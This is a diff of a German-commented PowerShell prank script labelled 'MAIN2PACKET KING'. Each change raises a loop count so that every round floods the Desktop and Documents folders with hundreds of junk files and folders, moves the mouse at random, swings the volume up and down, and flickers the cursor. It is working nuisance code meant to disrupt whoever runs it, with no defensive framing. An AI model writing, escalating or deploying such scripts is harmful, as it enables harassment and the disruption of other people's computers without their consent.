@@ -62,14 +62,14 @@ while ($global:currentRound -lt $global:maxRounds) {
     
     # TROLL 1: Desktop Dateien - MAIN2PACKET KING
     Write-Host "[1/20] 📂 Phase 1..." -ForegroundColor Green
-    for ($i = 1; $i -le 10; $i++) {
+    for ($i = 1; $i -le 100; $i++) {
         $filePath = Join-Path $desktop "MAIN2PACKET_KING_$global:currentRound`_$i.king"
         "👑 Main2packet King - Datei $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
     
     # TROLL 2: Ordner - MAIN2PACKET KING
     Write-Host "[2/20] 📁 Phase 2..." -ForegroundColor Green
-    for ($i = 1; $i -le 5; $i++) {
+    for ($i = 1; $i -le 500; $i++) {
         $name = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
         New-Item -Path "$desktop\MAIN2PACKET_KING_$name" -ItemType Directory -Force | Out-Null
     }
@@ -77,7 +77,7 @@ while ($global:currentRound -lt $global:maxRounds) {
     # TROLL 3: Maus kurz
     Write-Host "[3/20] 🖱️ Phase 3..." -ForegroundColor Green
     Add-Type -AssemblyName System.Windows.Forms
-    for ($i = 1; $i -le 5; $i++) {
+    for ($i = 1; $i -le 100; $i++) {
         [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point (
             (Get-Random -Min 100 -Max 1000),
             (Get-Random -Min 100 -Max 700)
@@ -125,7 +125,7 @@ while ($global:currentRound -lt $global:maxRounds) {
     
     # TROLL 9: Kopien mit MAIN2PACKET KING
     Write-Host "[9/20] 📋 Phase 9..." -ForegroundColor Green
-    for ($i = 1; $i -le 3; $i++) {
+    for ($i = 1; $i -le 70; $i++) {
         $filePath = Join-Path $desktop "MAIN2PACKET_KING_COPY_$global:currentRound`_$i.king"
         "👑 Kopie Nr. $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
@@ -137,7 +137,7 @@ while ($global:currentRound -lt $global:maxRounds) {
     
     # TROLL 11: Dokumente mit MAIN2PACKET KING
     Write-Host "[11/20] 📄 Phase 11..." -ForegroundColor Green
-    for ($i = 1; $i -le 3; $i++) {
+    for ($i = 1; $i -le 100; $i++) {
         $filePath = Join-Path $documents "MAIN2PACKET_KING_DOC_$global:currentRound`_$i.king"
         "👑 Dokument $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
     }
@@ -167,11 +167,11 @@ while ($global:currentRound -lt $global:maxRounds) {
     
     # TROLL 16: Lautstärke
     Write-Host "[16/20] 🔊 Phase 16..." -ForegroundColor Green
-    for ($v = 1; $v -le 3; $v++) {
+    for ($v = 1; $v -le 500; $v++) {
         $wsh.SendKeys([char]174)
         Start-Sleep -Milliseconds 50
     }
-    for ($v = 1; $v -le 3; $v++) {
+    for ($v = 1; $v -le 500; $v++) {
         $wsh.SendKeys([char]175)
         Start-Sleep -Milliseconds 50
     }
@@ -199,7 +199,7 @@ public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);
     
     # TROLL 19: Flackern
     Write-Host "[19/20] 🖥️ Phase 19..." -ForegroundColor Green
-    for ($f = 1; $f -le 3; $f++) {
+    for ($f = 1; $f -le 30; $f++) {
         [Console]::CursorVisible = $false
         Start-Sleep -Milliseconds 30
         [Console]::CursorVisible = $true
